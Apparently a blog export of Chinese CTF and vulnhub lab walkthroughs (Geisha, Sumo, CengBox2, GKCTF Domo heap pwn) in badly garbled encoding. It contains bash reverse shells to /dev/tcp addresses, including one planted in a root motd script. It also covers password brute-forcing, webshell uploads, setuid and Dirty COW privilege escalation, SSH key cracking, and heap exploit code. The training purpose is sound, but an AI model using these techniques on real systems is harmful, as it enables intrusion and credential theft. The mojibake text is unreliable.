ÂêéÈù¢ÁúãÂÖ∂‰ªñÁöÑÁ´ØÂè£ÔºåÂú®8088Á´ØÂè£ÂèëÁé∞‰∫Ü‰∏™uploadÈ°µÈù¢„ÄÇ‰∏ÄÂºÄÂßãÁî®dirb‰ªÄ‰πà‰πüÊ≤°Êâ´Âá∫Êù•ÔºåÂä†‰∫Ü‰∏™-xÂèÇÊï∞Êâ´ÂêéÁºÄÂêçÂ∞±Âá∫Êù•‰∫Ü„ÄÇ 1dirb http://192.168.189.135:8088/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt ‰∏ä‰º†‰∫Ü‰∏Ä‰∏™webshellÊµãËØï‰∏ãÔºåÂèëÁé∞ÈáçÂëΩÂêçÁßªÂéª‰∏Ä‰∏™Êñ∞ÁöÑÁõÆÂΩï„ÄÇÂΩìÂâçÁ´ØÂè£ËØï‰∫Ü‰∏ãÈÉΩÊ≤°ÊâæÂà∞‰∏ä‰º†ÁöÑwebshellÔºåÁúã‰∏ãwalkthoughÂéüÊù•ÊòØÂú®ÂÖ∂‰ªñÁ´ØÂè£ÁöÑhttpÊúçÂä°‰∏ä„ÄÇ Âú®8715Á´ØÂè£ÂèëÁé∞‰∫Ü‰∏ä‰º†ÁöÑwebshellÔºåÂú®ËøôÊ≠£Á°ÆË¶ÅÈ™åËØÅÊéàÊùÉÔºåÁõ¥Êé•Áî®sqlmapË∑ëÂá∫Êù•ÁöÑÁÆ°ÁêÜÂëòÂØÜÁ†ÅadminÂ∞±Ë°å‰∫Ü„ÄÇ ‰∏ÄÂè•ËØùÂèçÂºπ‰∫Ü‰∏™shell„ÄÇ 1system('/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.189.129/4444 0&gt;&amp;1"'); Áî®privilege-escalation-awesome-scripts-suiteÊî∂ÈõÜ‰ø°ÊÅØÔºåÊ≤°ÁúãËßÅÊúâ‰ªÄ‰πàËÉΩÂà©Áî®ÁöÑÁÇπ„ÄÇ ÁûÑ‰∫Ü‰∏ãÔºåÁî®‰∏™Êñ∞trickÔºöCapilitiesÁâπÊùÉÊìç‰ΩúÂ±ûÊÄßÔºåÂÖ∂‰∏≠CAP_SETUIDÂ±ûÊÄßÂèØÈÄöËøápython„ÄÅperlÊèêÊùÉÔºåCAP_DAC_READ_SEARCHÂèØÈÄöËøátarÊèêÊùÉ„ÄÇ Áî®‰∏ãÈù¢ÁöÑÂëΩ‰ª§ÊêúÁ¥¢ÂÖ∑ÊúâCapilitiesÁâπÊùÉÊìç‰ΩúÂ±ûÊÄßÁöÑÊñá‰ª∂„ÄÇ 1getcap -r / 2&gt;/dev/null python ËÆæÁΩÆuidÔºåÂÜçÂºπ‰∏™shellÂç≥ÂèØÊèêÊùÉÔºåÂëΩ‰ª§Â¶Ç‰∏ãÔºö 1/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")']]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>CAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CengBox2 walkthrought]]></title>
    <url>%2F2020%2F06%2F13%2FCengBox2_walkthrough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄËøôÂõûÊù•ÂÅö‰∏™‰∏≠Á≠âÈöæÂ∫¶ÁöÑÈù∂Êú∫CengBox2ÔºåÂèàÂ≠¶Âà∞‰∫ÜÂæàÂ§öÊñ∞Áü•ËØÜÔºåËøô‰∏™Èù∂Êú∫ËøòÊòØËÆæËÆ°ÂæóÊå∫Â•Ω„ÄÅÊå∫Â∑ßÂ¶ôÁöÑ„ÄÇ https://www.vulnhub.com/entry/cengbox-2,486/ Âà©Áî®ËøáÁ®ã‰ΩøÁî®nmapÊâ´ÊèèÂá∫21Ôºå22Âíå80Á´ØÂè£„ÄÇ 1nmap -sV -T 4 -p- 192.168.100.102 ÊâìÂºÄÁΩëÈ°µËØ¥ÁΩëÁ´ôÂ∑≤‰∏çÊèê‰æõÊúçÂä°Ôºå‰æãË°åÊâ´ÁõÆÂΩï‰πüÊòØÊ≤°Êâ´Âà∞Êâ´Êèè‰∏úË•ø„ÄÇ Âà©Áî®hydraÁàÜÁ†¥‰∏ãroot„ÄÅceng„ÄÅftpËøôÂá†‰∏™Ë¥¶Âè∑ÁöÑftpÂØÜÁ†ÅÔºåÂÖ∂‰∏≠Ë¥¶Âè∑ftpË¢´ÁàÜÁ†¥Âá∫Êù•‰∫ÜÔºåËÄå‰∏îÊòØÂ•ΩÂá†‰∏™ÂØÜÁ†ÅÔºÅÔºÅÂêéÈù¢ËØï‰∫Ü‰∏ãÂÖ∂ÂÆûÊòØÊ≤°ËÆæÂØÜÁ†ÅÔºåÁõ¥Êé•ËÉΩÁôªÂΩï„ÄÇ 1hydra -P /usr/share/wordlists/fasttrack.txt -L userlist.txt ftp://192.168.100.102 ÁôªÂΩïËøõÂéªÊúâ‰∏ÄÂàôÁïôË®ÄÔºåËØ¥Âú®‰∏Ä‰∏™Êñ∞ÁöÑÂüüÂêçceng-company.vmÈáåËÆæÁΩÆ‰∫Ü‰∏Ä‰∏™Èù¢ÊùøÔºåÂπ∂‰∏∫KevinÂàõÂª∫‰∏Ä‰∏™Áî®Êà∑ÔºåÂØÜÁ†Å‰∏∫ÈªòËÆ§ÂØÜÁ†ÅÔºåÈÇ£Â∞±ÊòØÂº±Âè£‰ª§ÂíØ :D Hey Kevin,I just set up your panel and used default password. Please change them before any hack. I try to move site to new domain which name is ceng-company.vm and also I created a new area for you. Aaron ÂΩìÊàëÊîπ/etc/hosts‰ª§ceng-company.vmËß£Êûê‰∏∫192.168.100.102ÔºåÈáçÊñ∞ÂõûÂà∞È°µÈù¢ÔºåÂÆÉËøòÊòØÂéüÊù•ÁöÑÊ†∑Â≠ê„ÄÇ ÂéªÂÅ∑ÁûÑ‰∫Ü‰∏ãÂà´‰∫∫ÁöÑwalkthroughÔºåÁΩëÁ´ôÂéüÊù•ÊòØÂú®Â≠êÂüüÂêçÈáå„ÄÇÁî±‰∫éÂ∏∏Áî®ÁöÑ‰∏Ä‰∫õÂ≠êÂüüÂêçÁàÜÁ†¥Â∑•ÂÖ∑ÈÉΩÊòØÂ±Ö‰∫éDNSÁöÑÔºåÂú®ËøôÈáåËÇØÂÆöÊòØÊ≤°Ê≥ïÁî®ÁöÑÔºåÊâÄ‰ª•Áõ¥Êé•ÊääÂ≠óÂÖ∏ÂØºÂÖ•Âà∞burpsuiteÈáåÔºåÊîπHostÁàÜÁ†¥Âç≥ÂèØ„ÄÇ ÁàÜÁ†¥Âà∞adminÊó∂ÂèØÁî®ÁúãËßÅËøîÂõûÁöÑÁä∂ÊÄÅÁ†ÅÂíåÈïøÂ∫¶ÈÉΩË∑üÂà´ÁöÑ‰∏ç‰∏ÄÊ†∑ÔºåÊâÄ‰ª•ÂèØ‰ª•Á°ÆÂÆöÊ≠£Á°ÆÁöÑÂ≠êÂüüÂêçÂ∞±ÊòØËøô‰∏™‰∫Ü„ÄÇ ÂÜçÂú®/etc/hostsÈáåÂä†‰∏ÄÊù°admin.cencompany.vmËß£ÊûêÂà∞192.168.100.102„ÄÇÊé•‰∏ãÊù•‰æùÊóßË¶ÅÁàÜÁ†¥ÁõÆÂΩïÔºå‰∏ÄÂºÄÂßã‰ΩøÁî®ÈªòËÆ§ÁöÑÂ≠óÂÖ∏Ê≤°ÁàÜÁ†¥Âá∫‰ªÄ‰πà‰∏úË•øÔºåÂêéÊù•Êç¢ÊàêdirbursterÁöÑÂ§ßÂ≠óÂÖ∏Â∞±ÂèØ‰ª•‰∫Ü„ÄÇËøôÈáåÊàëÁî®ÁöÑÊòØdirseachÊù•ÁàÜÁ†¥„ÄÇ 1python3 dirsearch.py -u http://admin.ceng-company.vm/ -e all -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 ÁΩëÁ´ôÊòØGila CMSÔºåÊêúÂà∞‰∫Ü‰∏§‰∏™ÊúâÁÇπÁî®ÁöÑÊ¥ûÔºåÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÂíåÊñá‰ª∂‰∏ä‰º†ÁªïËøá„ÄÇ ÂêéÂè∞‰∏∫adminÔºåÁî®Êà∑ÂêçÊèêÁ§∫‰∏∫ÈÇÆÁÆ±ÔºåÈÇ£Â∞±Áî®kevin@ceng-company.vm„ÄÇÁî®burpsuiteÁàÜÁ†¥ÔºåÊ≤°‰∏Ä‰ºöÂ∞±Áªôban‰∫Ü„ÄÇ ‰∫éÊòØÊâãÂä®ÁàÜÁ†¥ÔºåÊµãÂà∞adminÂ∞±ËøõÂÖ•Âà∞ÂêéÂè∞„ÄÇËøõÂà∞ÂêéÂè∞ÂèëÁé∞‰∏çÁî®ÊêúÂà∞ÁöÑÊºèÊ¥û‰πüË°åÔºåÂõ†‰∏∫ÊúâÊñá‰ª∂ÁÆ°ÁêÜÂäüËÉΩÔºåÁõ¥Êé•ÊèíÂÖ•‰∏ÄÂè•ËØùÂç≥ÂèØ„ÄÇ ÂèçÂºπ‰∏Ä‰∏™shellÔºåÁî®Privilege Escalation Awesome Scripts SUITEÊâ´Êèè‰∫Ü‰∏ãÂèØËÉΩÂèØ‰ª•ÊèêÊùÉÁöÑÁÇπ„ÄÇÂèëÁé∞www-dataÂèØ‰ª•Êó†ÈúÄÂØÜÁ†ÅÔºå‰ª•swartzÁöÑË∫´‰ªΩËøêË°å/home/swartz/runphp.sh„ÄÇ 123#!/bin/bashphp -a ËøêË°åËøô‰∏™ËÑöÊú¨ÂèØ‰∫§‰∫íÂú∞ËæìÂÖ•php‰ª£Á†ÅÔºåÈÇ£Âç≥ÂèØÂºπÂá∫swartzÁöÑshell„ÄÇÁî±‰∫éÂèçÂºπÁöÑshellÊòæÁ§∫phpÁöÑ‰∫§‰∫íÁïåÈù¢‰∏çÊ≠£Â∏∏ÔºåÂèØ‰ª•Áî®python3ÂºπÂá∫‰∏™ÂÆåÊï¥ÁöÑshell„ÄÇ 12python3 -c "import pty;pty.spawn('/bin/bash')"sudo -u swartz /home/swartz/runphp.sh Áé∞Âú®Â∞±ÊòæÁ§∫Ê≠£Â∏∏‰∫Ü„ÄÇ ÂÜçËæìÂÖ•system(&quot;/bin/bash&quot;);ÂºπÂá∫swartzÁöÑshellÔºåÁî®ÊèêÊùÉËÑöÊú¨ÈáçÊñ∞Êâ´Êèè‰∏ãÔºåÂèëÁé∞swartzÂèØ‰ª•ËØªmitnickÁî®Êà∑ÁõÆÂΩï‰∏ãÁöÑsshÁßÅÈí•„ÄÇ ÊääÁßÅÈí•‰∏ãËΩΩ‰∏ãÊù•Ôºå‰ΩøÁî®ÁßÅÈí•ËøûÊé•sshÊó∂ÔºåÂèëÁé∞ÊòØÈúÄË¶ÅpassphraseÁöÑ„ÄÇ johnÂèØ‰ª•Á†¥Ëß£passphraseÔºåÂÖàÊäässhÁßÅÈí•ËΩ¨‰∏∫johnÂèØËØÜÂà´ÁöÑÊ†ºÂºèÔºåÂÜçËøõË°åÁàÜÁ†¥„ÄÇ 12/usr/share/john/ssh2john.py /tmp/rsa &gt; /tmp/tmpjohn --wordlist=/usr/share/wordlists/rockyou.txt /tmp/tmp Áî®ÂØÜÁ†ÅlegendÔºåÁôªÂΩïÂà∞mitnickÔºåcat ~/user.txtÊãøÂà∞homeÁõÆÂΩï‰∏ãÁöÑflag„ÄÇ Èô§‰∫ÜÊó†ÈúÄÂØÜÁ†Åsudo -uÂ§ñÔºåÊâ´ÊèèËøòÂèëÁé∞‰∫Ü/etc/update-motd.dÁõÆÂΩï‰∏ãÁöÑËÑöÊú¨ÂèØÂÜô„ÄÇËøô‰∏ãËÑöÊú¨ÊòØÂ±û‰∫érootÁöÑÂèØÊâßË°åÊñá‰ª∂ÔºåÊØèÂΩìÊúâÁî®Êà∑ÈÄöËøásshÁôªÂΩïÊó∂‰ºö‰ª•rootÊùÉÈôêËá™Âä®ËøêË°åÔºåËøêË°åÁªìÊûúÂ∞±ÊòØÊàë‰ª¨sshÁôªÂΩïÊó∂ÁúãÂà∞ÁöÑÊ¨¢Ëøé‰ø°ÊÅØ„ÄÇ Âú®ÂÖ∂‰∏≠‰∏Ä‰∏™ËÑöÊú¨ÈáåÊèíÂÖ•‰∏™ÂèçÂºπshellÔºåÈÄÄÂá∫Âπ∂ÈáçÊñ∞ÁôªÂΩïsshÔºåÊàêÂäüÂèçÂºπrootÁöÑshellÂõûÊù•„ÄÇ 1/bin/bash -c "bash -i &gt;&amp; /dev/tcp/192.168.100.101/4444 0&gt;&amp;1" ÂèÇËÄÉCengBox 2 Vulnhub Walkthrough]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>update-motd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sumo walkthrought]]></title>
    <url>%2F2020%2F06%2F12%2FSumo-walkthrough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄËøô‰πüÊòØ‰∏Ä‰∏™ÂæàÁÆÄÂçïÁöÑÈù∂Êú∫ÔºåÁî®Âà∞ÁöÑÁü•ËØÜÁÇπÊòØCVE-2014-6278ÁöÑbashÂëΩ‰ª§Ê≥®ÂÖ•ÂíådirtycowÊèêÊùÉ„ÄÇ https://www.vulnhub.com/entry/sumo-1,480/ Âà©Áî®ËøáÁ®ãÊãøÂà∞ÊâãËÇØÂÆöÊòØË¶Å‰ø°ÊÅØÊî∂ÈõÜ‰∏ÄÊ≥¢ÔºånmapÊâ´Âà∞Âè™ÂºÄÊîæ‰∫Ü22Á´ØÂè£Âíå80Á´ØÂè£„ÄÇ 80Á´ØÂè£ËøõÂéªÊòØÈªòËÆ§È°µÈù¢ÔºåÁõÆÂΩïÊâ´Âá∫‰∫Ücgi-binÂíåserver-statusÁõÆÂΩïÔºåÁä∂ÊÄÅÁ†ÅÈÉΩÊòØ403„ÄÇ ÂÜçÁî®niktoÊâ´‰∏ãÔºåÊâ´Âá∫Êù•‰∫ÜCVE-2014-6278ÂíåCVE-2014-6271ÔºåÊòØbashÂëΩ‰ª§Ê≥®ÂÖ•ÁöÑÊºèÊ¥ûÔºåmsfÈáåÂ∑≤Êúâexp„ÄÇ ËøõmsfÈÄâ‰∏≠Âà©Áî®Ê®°ÂùóÔºåËÆæÁΩÆÂ•ΩÂèÇÊï∞ÔºåÊîªÂáªÂêéÊ≠£Â∏∏ËøîÂõû‰∏Ä‰∏™meterpreter session„ÄÇ ÂêØÂä®‰∏Ä‰∏™shell‰πãÂêéÔºåËøêË°åwhoamiÂëΩ‰ª§Âíåuname -aÂëΩ‰ª§„ÄÇÂΩìÂâçÁî®Êà∑ÊòØwww-dataÔºåÂπ∂‰∏îÂèëÁé∞ÂÜÖÊ†∏ÁâàÊú¨ËæÉ‰ΩéÔºåÂèØÁî®dirtycowÊèêÊùÉ„ÄÇ ‰ΩøÁî®github‰∏äÁöÑexp https://github.com/FireFart/dirtycow ‰∏ä‰º†Âà∞Èù∂Êú∫ÔºåÂπ∂Áî®‰ª•‰∏ãÂëΩ‰ª§ÁºñËØëËøêË°å 12gcc dirty.c -o dirty lpthread./dirty &lt;new_password&gt; ÂëΩ‰ª§ÊâßË°åÂêéË¶ÅÁ≠â‰∏ÄÊÆµÊó∂Èó¥ÔºåÊàêÂäüÂêé‰ºöÂàõÂª∫Âêç‰∏∫firefartÁöÑrootÁî®Êà∑ÔºåÂØÜÁ†Å‰∏∫ËøêË°åÂëΩ‰ª§Êó∂ËæìÂÖ•ÁöÑÂØÜÁ†Å„ÄÇ sshÁôªÂΩï‰∏äÂéªÔºåÂú®/rootÁõÆÂΩïÂç≥ÂèØËé∑Âæóflag„ÄÇ]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>ËÑèÁâõ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Geisha walkthrought]]></title>
    <url>%2F2020%2F06%2F11%2FGeisha-walkthrough%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂáÜÂ§áÊé•ÂèóÁ§æ‰ºöÊØíÊâìÔºåÂÖàÊâæÂá†‰∏™Èù∂Êú∫ÊâìÊâìÔºåÊèêÈ´òÂÜÖÁΩë„ÄÅÂêéÊ∏óÈÄèÊ∞¥Âπ≥ÔºåÂÖçÂæó‰∏ç‰ºöÊ∑±ÂÖ•Â∞±ËØ¥‰Ω†noobÔºåÁñØÁãÇË∏©„ÄÇ Ëµ∑ÊâãÂÖàÂéªvulnhubÊâæ‰∫Ü‰∏™ÂÖ•Èó®Âà∞‰∏≠Èó¥ÈöæÂ∫¶ÁöÑÈù∂Êú∫Geisha(Âè´ÁªôÂï•ÔºüÔºü)ÔºåÁõÆÊ†áÔºöGet the root shell and then obtain flag under /root)„ÄÇ Âà©Áî®ÊääÊâÄÊúâÁ´ØÂè£ÈÉΩÊâ´‰∫Ü‰∏ÄÈÅçÔºåÂèëÁé∞ÂºÄÂêØ‰∫Üftp„ÄÅsshÂíåÂæàÂ§öhttpÊúçÂä°ÁöÑÁ´ØÂè£„ÄÇ ÊØè‰∏™httpÊúçÂä°‰∏ªÈ°µÈÉΩÊòØ‰∏ÄÂº†ÂõæÁâáÔºåÊ≤°‰ªÄ‰πàÂäüËÉΩÔºå‰ΩÜÂÖ∂‰∏≠Âú®7125Á´ØÂè£Êâ´Âà∞‰∫ÜpasswdÂíåshadowÔºåpasswdËÉΩ‰∏ãËΩΩ‰∏ãÊù•„ÄÇÂú®shadowÈáåÁúãËßÅÊúâ‰∏§‰∏™Ë¥¶Âè∑ÂèØÁôªÂΩïÂàÜÂà´ÊòØrootÂíågeishaÔºå‰∫éÊòØÁî®hydraË∑ë‰∏ãÂº±Âè£‰ª§„ÄÇ Áî®‰∏™Â∞èÂ≠óÂÖ∏‰∏Ä‰∏ãÂ≠êÂ∞±Ë∑ëÂá∫Êù•‰∫ÜÔºå‰∫ãÊÉÖÂèëÂ±ïÂà∞ÁõÆÂâç‰∏∫Ê≠¢‰ºº‰πéËøòÊå∫È°∫Âà©„ÄÇ ‰ΩÜÊòØuname -aÁúã‰∏ãÈù∂Êú∫ÁöÑÂèëË°åÁâàÊú¨Êå∫Êñ∞ÁöÑÔºåÂÅ∑ÁûÑ‰∫Ü‰∏ãÂà´‰∫∫ÁöÑwalkthoughÔºåÂèëÁé∞ÊòØÂà©Áî®SUIDÂèØÊâßË°åÊñá‰ª∂ËøêË°åÊó∂ÂèØÊöÇÊó∂Ëé∑ÂæóÊñá‰ª∂Êã•ÊúâËÄÖÁöÑÊùÉÈôêÁöÑËøô‰∏™ÁâπÁÇπÊù•ÊèêÊùÉÁöÑÔºàÊñ∞ÊäÄËÉΩgetÔºâ„ÄÇ ‰ΩøÁî®ÂëΩ‰ª§find / -perm -u=s -type f 2&gt;/dev/nullÊêúÁ¥¢ÊâÄÊúâSUIDÂèØÊâßË°åÊñá‰ª∂ÔºåÂèëÁé∞‰∏™base32ÂèØ‰ª•Áî®Êù•‰ªªÊÑèÊñá‰ª∂ËØªÂèñ„ÄÇ Áî®base32 /root/flag.txt | base32 -dÁõ¥Êé•ËØªflagÊàñËÄÖbase32 /root/.ssh/id_rsa | base32 -dËØªsshÁßÅÈí•Âú®Êú¨Âú∞ÂØºÂÖ•Âç≥ÂèØ„ÄÇ ÂèÇËÄÉLinux Privilege Escalation using SUID Binaries]]></content>
      <categories>
        <category>Èù∂Êú∫</category>
      </categories>
      <tags>
        <tag>SUID</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[PWN]GKCTF 2020 DomoÂàÜÊûê]]></title>
    <url>%2F2020%2F05%2F27%2FGKCTF%202020%20Domo%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄËøôÈÅìÈ¢òÁúüÂøÉËßâÂæóÂá∫Âæó‰∏çÈîôÔºå‰∏ÄÈÅìÈ¢òÂ≠¶Âà∞‰∫ÜÂæàÂ§öÊñ∞ÁöÑÁü•ËØÜ„ÄÇ ÊÑüË∞¢Âá∫È¢ò‰∫∫starssgoÂ∏àÂÇÖÂíånocbtmÂ∏àÂÇÖÁöÑÊÄùË∑ØÂíåwriteupÔºå‰∏ãÈù¢Â∞±Êù•ËØ¶ÁªÜÂàÜÊûê‰∏Ä‰∏ãËß£È¢òÊÄùË∑ØÂíåÂÖ∂‰∏≠Áî®Âà∞ÁöÑËß£È¢òÊäÄÂ∑ß„ÄÇ Â≠òÂú®ÁöÑÊºèÊ¥û off by null 1234567891011121314151617181920212223242526272829303132unsigned __int64 cmd_add()&#123; size_t nbyte; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); if ( (unsigned int)sub_C16() == 1 &amp;&amp; count &lt;= 8 ) &#123; for ( HIDWORD(nbyte) = 0; SHIDWORD(nbyte) &lt;= 8; ++HIDWORD(nbyte) ) &#123; if ( !ptr[SHIDWORD(nbyte)] ) &#123; puts("size:"); _isoc99_scanf("%d", &amp;nbyte); if ( (nbyte &amp; 0x80000000) == 0LL &amp;&amp; (signed int)nbyte &lt;= 288 ) &#123; ptr[SHIDWORD(nbyte)] = malloc((signed int)nbyte); puts("content:"); read(0, ptr[SHIDWORD(nbyte)], (unsigned int)nbyte); *((_BYTE *)ptr[SHIDWORD(nbyte)] + (signed int)nbyte) = 0; ++count; &#125; else &#123; puts("sobig"); &#125; return __readfsqword(0x28u) ^ v2; &#125; &#125; &#125; return __readfsqword(0x28u) ^ v2;&#125; Ê∑ªÂä†Áî®Êà∑Ëøô‰∏™ÂáΩÊï∞ËøôÈáåÔºåÂú®ËæìÂÖ•ÂÆåÂÜÖÂÆπ‰πãÂêéÔºå‰ºöÂä†‰∏™\x00ËøõË°åÊà™Êñ≠ÔºåÁÑ∂ËÄåÂä†\x00ÁöÑ‰ΩçÁΩÆÊòØ‰ªñÁöÑsize‰ΩçÁΩÆÔºåË∂ÖÂá∫‰∫Ü‰ªñÁöÑÁ©∫Èó¥Â§ßÂ∞è„ÄÇËøôÊ†∑Â∞±ËÉΩ‰øÆÊîπ‰∏ã‰∏Ä‰∏™chunkÁöÑszieÔºåÂÆûÁé∞Êîπpre_inuseÂíåÊîπÂ∞è‰∏ã‰∏Ä‰∏™chunkÁöÑsize„ÄÇ ÂèàÂõ†‰∏∫ÊòØsize‰ΩçÁΩÆÊîπÊàê\x00ÔºåËæìÂÖ•ÁöÑsizeÁ®ç‰∏çÊ≥®ÊÑèÂ∞±‰ºöÈîôÊîπ‰∫Ü‰ªÄ‰πà‰∏úË•ø-_-!ÔºåËøôÈÉΩÊòØÂêéËØù„ÄÇ ‰ªªÊÑèÂú∞ÂùÄÂÜô 1234567891011121314151617181920212223242526272829unsigned __int64 __fastcall cmd_edit(_DWORD *a1, _DWORD *a2, _DWORD *a3)&#123; _DWORD *v4; // [rsp+8h] [rbp-28h] void *buf; // [rsp+20h] [rbp-10h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v4 = a3; v6 = __readfsqword(0x28u); buf = 0LL; if ( (unsigned int)sub_C16() == 1 ) &#123; if ( *a1 &amp;&amp; *a2 &amp;&amp; *v4 ) &#123; puts("addr:"); _isoc99_scanf("%ld", &amp;buf); puts("num:"); read(0, buf, 1uLL); *a1 = 0; *a2 = 0; *v4 = 0; puts("starssgo need ten girl friend "); &#125; else &#123; puts("You no flag"); &#125; &#125; return __readfsqword(0x28u) ^ v6;&#125; ËøôÈáåÂæàÂÆπÊòìÂ∞±ÁúãÂá∫Êù•‰∫ÜÔºåËæìÂÖ•‰ªªÊÑèÂú∞ÂùÄÔºå‰øÆÊîπÊúÄÂêé‰∏Ä‰∏™Â≠óËäÇÔºå‰∏îÂè™ÊúâÊîπ‰∏ÄÊ¨°ÁöÑÊú∫‰ºö„ÄÇ Âà©Áî®ËøáÁ®ã‰ª•‰∏ã‰ª£Á†ÅÂùóÈô§‰∫ÜexpÂ§ñÔºåindexÈÉΩÊòØ‰ª£Á†ÅÂùóÂÜÖ‰ªé0ÁÆóËµ∑ÁöÑÁõ∏ÂØπindex„ÄÇ 0x0 leak libc addressÂíåheap addressÂØπ‰∫élibc addressÔºåË¶ÅÂÖàÂàõ‰∏Ä‰∏™sizeÂ§ß‰∫é80ÔºåÊó¢freeÂêé‰ºöËøõÂÖ•unsorted binÁöÑchunkÔºåÂÜçÂàõ‰∏Ä‰∏™chunkÂû´Â∫ïÔºåÈò≤Ê≠¢top chunk‰ºöË∑üunsorted binÂêàÂπ∂„ÄÇÂà†Èô§Á¨¨‰∏Ä‰∏™chunkËøõÂÖ•unsorted binÔºåË¢´Âà†Èô§ÁöÑchunkÁöÑfdÂíåbkÂ∞±‰ºöÊúâÊåáÂêëmain_arenaËåÉÂõ¥ÁöÑÂú∞ÂùÄ„ÄÇ 123cmd_add(0xf0,'')cmd_add(0x10,'')cmd_del(0) ÁÑ∂ÂêéÂÜçÁî≥ËØ∑‰∏éËøô‰∏™unsorted binchunkÂêåÊ†∑Â§ßÂ∞èÁöÑchunkÔºåÂÜÖÂÆπËæìÂÖ•‰∏∫Á©∫ÔºåÂõ†‰∏∫ÊàëËøôÈáåÁî®ÁöÑÊòØsendlineÔºåÊç¢Ë°åÁ¨¶\x0a‰ºöË¶ÜÁõñfdÁöÑÊúÄÂêé‰∏Ä‰∏™Â≠óËäÇÔºåËøôÈáå\x00ÂØπfdÊ≤°ÂΩ±Âìç„ÄÇ Áî®showÂáΩÊï∞Â∞±ËÉΩËæìÂá∫main_arenaÁöÑÂú∞ÂùÄÔºåÂèàÂõ†‰∏∫main_arenaÁöÑÂú∞ÂùÄÁõ∏ÂØπlibcÂú∞ÂùÄÁöÑÂÅèÁßªÊòØ‰∏ÄÂÆöÁöÑÔºåÊâÄ‰ª•ËÉΩÂ§üËÆ°ÁÆóÂá∫libcÂú∞ÂùÄ„ÄÇÂÖ∑‰ΩìÂÅèÁßªÊòØÂ§öÂ∞ëÂèØ‰ª•Áî®gdbÁöÑvmmapÂëΩ‰ª§ËÆ°ÁÆóÂá∫Êù•„ÄÇ 12cmd_add(0xf0,'')main_arena = u64(cmd_show(0).ljust(8,'\x00')) + offset leak heap addressÁöÑÊÄùË∑ØÂ∑Æ‰∏çÂ§öÔºåÂàõ‰∏§‰∏™ÂêåÊ†∑Â∞èÁöÑchunkÔºåÂÜçÈÉΩfreeÊéâËøõfastbins„ÄÇÁ¨¨‰∫å‰∏™freeÁöÑchunkÁöÑfd‰ºöÊåáÂêëÁ¨¨‰∏ÄfreeÁöÑchunkÔºåÁÑ∂Âêé‰∏ÄÊ†∑ÈáçÊñ∞Áî≥ËØ∑‰∏Ä‰∏™ÂêåÊ†∑Â§ßÂ∞èÁöÑchunkÔºåÂÜôÂÖ•ÂÜÖÂÆπÁ©∫ÔºåÂÜçËæìÂá∫„ÄÇ 12345cmd_add(0x10,'')cmd_add(0x10,'')cmd_del(0)cmd_add(0x10,'')main_arena = u64(cmd_show(0).ljust(8,'\x00')) + offset ËøôÈáåËæìÂÖ•ÁöÑsizeË¶ÅËÆæËÆ°ÂæóÂΩìÔºå‰∏çÁÑ∂‰∏Ä‰∏çÂ∞èÂøÉÂ∞±Ë¶ÜÁõñ‰∫ÜÂêéÈù¢chunkÁöÑsize„ÄÇÁâπÂà´ÂêéÈù¢fastbins attackÊó∂ÂÄô‰∏çÂØπÈΩêÁöÑfake chunkÔºåÊàëÂú®ËøôÈáåË∏©‰∫Ü‰∏çÂ∞ëÂùë„ÄÇ 0x01 chunk overlapchunk overlapËøôÈÉ®ÂàÜÊàëÁî≥ËØ∑‰∏â‰∏™chunkÔºåËæìÂÖ•ÁöÑsizeÂàÜÂà´ÊòØ0x40„ÄÅ0x68Âíå0xf0„ÄÇÁ¨¨‰∏Ä‰∏™chunkÊîæfake chunkÔºåÁ¨¨‰∫å‰∏™chunk‰øÆÊîπfake chunkÁöÑnext_sizeÔºåÂõ†‰∏∫Á¨¨‰∏â‰∏™chunkÁöÑsizeÊòØ0x101ÔºåÈ°∫‰æøÁî®off by null‰øÆÊîπÁ¨¨‰∏â‰∏™chunkÁöÑpre_inuseÔºåËÄåÁ¨¨‰∏â‰∏™chunkÁöÑ‰ΩúÁî®Á∫ØÁ≤πÊòØÂÆÉÁöÑpre_inuseË¢´‰øÆÊîπÂêéÔºåÊ†πÊçÆÂÆÉÁöÑpre_sizeÂêëÂâçunlink„ÄÇ ËøòÊúâÂ∞±ÊòØfake chunkÈÇ£‰∏™Ë¶Å‰º™ÈÄ†‰∏ãfdÂíåbkÊåáÂêëËá™Â∑±ÔºåÂâçÈù¢Êúâ‰∫Ühead addrÔºåÂú®fake chunkÁöÑ0x18Â§ÑÊîæfake chunkÁöÑÂú∞ÂùÄÔºå‰ª§fake chunk-&gt;fd-&gt;bk=fake chunk‰∏îfake chunk-&gt;bk-&gt;fd=fake chunkÂ∞±OK„ÄÇ È¢òÁõÆÁöÑeditÂáΩÊï∞ÈùûÂ∏∏ËßÑeditÔºåÊÉ≥‰øÆÊîπchunkÂæófreeÊéâÂÜçÈáçÊñ∞Áî≥ËØ∑„ÄÇ 123456cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_add(0x68,'')cmd_add(0xf0,'')cmd_del(1)cmd_add(0x68,flat('\x00'*0x60,0xb0))cmd_del(2) freeÁ¨¨‰∏âÂùóchunkÂâçÂ†ÜÁöÑÊÉÖÂÜµÔºö freeÁ¨¨‰∏âÂùóchunkÂêéÔºåÂ†ÜÊàêÂäüÈáçÂè†Ôºö ËøôÊó∂ÂÄôÂ∞±ÂèØ‰ª•ÊéßÂà∂Á¨¨‰∫å‰∏™chunk‰∏∫ÊâÄÊ¨≤‰∏∫„ÄÇ 